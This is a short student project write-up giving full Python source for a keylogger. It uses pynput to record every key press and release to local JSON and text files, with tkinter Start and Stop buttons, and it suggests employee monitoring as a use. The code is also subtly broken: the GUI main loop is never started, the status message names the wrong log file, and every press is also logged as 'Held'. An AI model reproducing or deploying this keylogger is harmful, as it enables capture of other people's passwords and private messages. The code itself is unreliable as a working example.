# project---
Cybersecurity Project on Keylogger Capturing Keystrokes 
First, the module pynput was installed. This module is used to control and monitor keyboard or mouse/trackpad activities. 
Keylogger class was created that contained all the methods tgqt were needed to perform keylogger activities.
 A directory that contained the log files.
A static method was created that returned key information if a key is pressed. 
The project provides a Python implementation of a keylogger. Each key event is stored in a list which is later converted to JSON format and saved to a file.



CODE-
import tkinter as tk
from tkinter import *
from pynput import keyboard
import json

keys_used = []
flag = False
keys = ""

def generate_text_log(key):
    with open('key_log.txt',"w+") as keys:
        keys.write(key)

def generate_json_file(keys_used):
    with open('key_log.json', '+wb') as key_log:
        key_list_bytes = json.dumps(keys_used).encode()
        key_log.write(key_list_bytes)
    
def on_press(key):
    global flag, keys_used, keys
    if flag == False:
        keys_used.append(
            {'Pressed':f'{key}'}
        )
        flag = True
    
    if flag == True:
        keys_used.append(
            {'Held':f'{key}'}
        )
    generate_json_file(keys_used)


def on_release(key):
    global flag, keys_used, keys
    keys_used.append(
        {'Released':f'{key}'}
    )

    if flag == True:
        flag = False
    generate_json_file(keys_used)

    keys = keys+str(key)
    generate_text_log(str(keys))

def start_keylogger():
    global listener
    listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    listener.start()
    label.config(text="[+] Keylogger is running!\n[!] Saving the keys in 'keylogger.txt'")
    start_button.config(state='disabled')
    stop_button.config(state='normal')

def stop_keylogger():
    global listener
    listener.stop()
    label.config(text="Keylogger stopped.")
    start_button.config(state='normal')
    stop_button.config(state='disabled')

root = Tk()
root.title("Keylogger")

label = Label(root, text='Click "Start" to begin keylogging.')
label.config(anchor=CENTER)
label.pack()

start_button = Button(root, text="Start", command=start_keylogger)
start_button.pack(side=LEFT)

stop_button = Button(root, text="Stop", command=stop_keylogger, state='disabled')
stop_button.pack(side=RIGHT)

root.geometry("250x100") 

RESULTS:
A keylogger records keystrokes made by the user on their computer. Keyloggers can be used for monitoring employee activities or detecting and preventing unauthorised access.
